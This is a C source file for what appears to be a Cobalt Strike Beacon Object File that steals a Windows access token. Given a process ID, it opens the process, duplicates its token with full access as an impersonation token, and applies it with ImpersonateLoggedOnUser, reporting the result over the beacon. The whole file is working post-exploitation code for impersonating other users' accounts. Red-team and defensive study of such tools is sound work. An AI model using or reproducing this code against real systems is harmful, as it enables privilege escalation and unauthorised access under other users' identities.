#include <windows.h>
#include "beacon.h"
#include "bofdefs.h"
#include "../tkerror.h"

VOID go(IN PCHAR Buffer, IN ULONG Length)
{
    datap parser;
    DWORD pid      = 0;
    BOOL  no_apply = FALSE;

    BeaconDataParse(&parser, Buffer, Length);
    pid      = (DWORD) BeaconDataInt(&parser);
    no_apply = (BOOL)  BeaconDataInt(&parser);

    HANDLE hProcess = NULL;
    HANDLE hToken   = NULL;
    HANDLE hDup     = NULL;
    DWORD  dwError  = 0;
    char   errMsg[256];

    hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess)
    {
        dwError = KERNEL32$GetLastError();
        TkErrorMessage(dwError, errMsg, sizeof(errMsg));
        BeaconPrintf(CALLBACK_ERROR, "[-] steal: OpenProcess failed: %s\n", errMsg);
        return;
    }

    if (!ADVAPI32$OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken))
    {
        dwError = KERNEL32$GetLastError();
        TkErrorMessage(dwError, errMsg, sizeof(errMsg));
        BeaconPrintf(CALLBACK_ERROR, "[-] steal: OpenProcessToken failed: %s\n", errMsg);
        NTDLL$NtClose(hProcess);
        return;
    }

    if (!ADVAPI32$DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
                                   SecurityImpersonation, TokenImpersonation, &hDup))
    {
        dwError = KERNEL32$GetLastError();
        TkErrorMessage(dwError, errMsg, sizeof(errMsg));
        BeaconPrintf(CALLBACK_ERROR, "[-] steal: DuplicateTokenEx failed: %s\n", errMsg);
        NTDLL$NtClose(hToken);
        NTDLL$NtClose(hProcess);
        return;
    }

    NTDLL$NtClose(hToken);
    NTDLL$NtClose(hProcess);

    if (!no_apply)
    {
        if (!ADVAPI32$ImpersonateLoggedOnUser(hDup))
        {
            dwError = KERNEL32$GetLastError();
            TkErrorMessage(dwError, errMsg, sizeof(errMsg));
            BeaconPrintf(CALLBACK_ERROR, "[-] steal: ImpersonateLoggedOnUser failed: %s\n", errMsg);
            NTDLL$NtClose(hDup);
            return;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Handle: 0x%llx\n", (unsigned long long) hDup);
    }
    else
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Handle: 0x%llx (impersonation not applied)\n", (unsigned long long) hDup);
    }
}
